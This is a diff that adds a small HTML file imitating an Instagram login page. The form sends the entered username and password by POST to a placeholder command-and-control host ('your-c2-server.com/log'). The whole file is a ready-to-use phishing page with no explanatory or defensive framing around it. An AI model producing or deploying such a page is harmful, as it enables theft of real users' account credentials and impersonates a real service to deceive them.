@@ -1,0 +1,14 @@
+<!DOCTYPE html>  
+<html>  
+<head>  
+    <title>Instagram Login</title>  
+</head>  
+<body>  
+    <h2>Login to Instagram</h2>  
+    <form action="http://your-c2-server.com/log" method="POST">  
+        <input type="text" name="username" placeholder="Username">  
+        <input type="password" name="password" placeholder="Password">  
+        <button>Login</button>  
+    </form>  
+</body>  
+</html>  
